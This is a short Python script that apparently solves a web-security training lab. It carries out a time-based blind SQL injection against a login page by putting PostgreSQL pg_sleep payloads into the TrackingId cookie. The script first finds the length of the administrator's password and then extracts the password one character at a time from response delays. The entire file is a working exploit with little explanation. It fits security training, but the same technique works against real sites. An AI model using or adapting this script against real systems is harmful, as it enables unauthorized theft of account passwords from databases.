import requests
import concurrent.futures
from urllib.parse import quote

#sqnce__gcyvjdgiw3c5e
#sqnce80gnyvldgmw3z6m
payload_len = "YJubPNPfgPjUrDMU'; SELECT CASE WHEN (length(password)={}) THEN pg_sleep(2) ELSE pg_sleep(0) END from users where username='administrator' --"
payload = "YJubPNPfgPjUrDMU'; SELECT CASE WHEN (substring(password,{},1)='{}') THEN pg_sleep(2) ELSE pg_sleep(0) END from users where username='administrator' --"
values = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p','q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
vuln_url = "https://0ab5006f04c1e25083563d44009e00af.web-security-academy.net/login"
session = "jnImK9LPaHxl7JtamtyutxntTnb5PWyq"
password = [0 for i in range(21)]
def send_request_confirm(length):
    print("Starting with payload {}".format(payload_len.format(length)))
    quoted_payload = quote(payload_len.format(length))
    response = requests.get(url=vuln_url, cookies={
        "TrackingId": quoted_payload,
        "session": session
    })
    print("Elapsed time {}".format(response.elapsed))
    # print(response.content)
    if response.elapsed.seconds >= 3:
        print("Length is {}".format(length))
        # print(response.content)

def send_request_confirm_pass(length, character, time):
    print("Starting with l={} c={}".format(length, character))
    quoted_payload = quote(payload.format(length, character))
    response = requests.get(url=vuln_url, cookies={
        "TrackingId": quoted_payload,
        "session": session
    })
    print("Elapsed time {}".format(response.elapsed))
    # print(response.content)
    if response.elapsed.seconds >= time:
        print("-------------------Length is {} and Character is {}".format(length, character))
        password[length] = character
        time = response.elapsed.seconds
    return time

# send_request_confirm(0)

with concurrent.futures.ThreadPoolExecutor(max_workers=1) as tf:
    results = [tf.submit(send_request_confirm, i) for i in range(25)]


for j in range(1,21):
# for j in [12,15]:
    t=2
    for i in values:
        t = send_request_confirm_pass(j, i, t)


print("Password is {}".format(password))